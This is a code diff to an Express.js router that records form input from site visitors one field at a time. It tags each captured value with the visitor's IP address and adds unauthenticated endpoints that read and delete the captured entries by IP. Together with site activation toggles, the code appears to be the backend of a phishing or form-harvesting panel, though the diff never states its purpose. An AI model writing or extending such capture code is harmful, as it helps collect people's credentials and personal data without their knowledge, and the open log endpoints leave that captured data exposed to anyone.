@@ -1,6 +1,6 @@
 import { Router, type IRouter, type Request, type Response } from "express";
 import healthRouter from "./health";
-import { globalProvider, getSiteActive, setSiteActive, captureFormDataHTTP } from "../ws.js";
+import { globalProvider, getSiteActive, setSiteActive, captureFormDataHTTP, readCapturesByIp, deleteCapturesByIp } from "../ws.js";
 
 const router: IRouter = Router();
 
@@ -54,8 +54,25 @@ router.get('/location', async (req: Request, res: Response) => {
 router.post('/capture', (req: Request, res: Response) => {
   const { visitorId, field, value } = req.body as { visitorId?: string; field?: string; value?: string };
   if (!visitorId || !field || value == null) return res.status(400).json({ error: 'missing fields' });
-  const result = captureFormDataHTTP(visitorId, field, value);
+  const fwd = req.headers['x-forwarded-for'];
+  const raw = fwd ? (Array.isArray(fwd) ? fwd[0] : fwd).split(',')[0]?.trim() : req.socket.remoteAddress ?? '0.0.0.0';
+  const visitorIp = (raw ?? '0.0.0.0').replace(/^::ffff:/, '');
+  const result = captureFormDataHTTP(visitorId, visitorIp, field, value);
   return res.json(result);
+});
+
+router.get('/capture-log', (req: Request, res: Response) => {
+  const ip = (req.query['ip'] as string | undefined) ?? '';
+  if (!ip) return res.status(400).json({ error: 'ip required' });
+  const entries = readCapturesByIp(ip);
+  return res.json({ entries });
+});
+
+router.delete('/capture-log', (req: Request, res: Response) => {
+  const ip = (req.query['ip'] as string | undefined) ?? '';
+  if (!ip) return res.status(400).json({ error: 'ip required' });
+  deleteCapturesByIp(ip);
+  return res.json({ ok: true });
 });
 
 export default router;
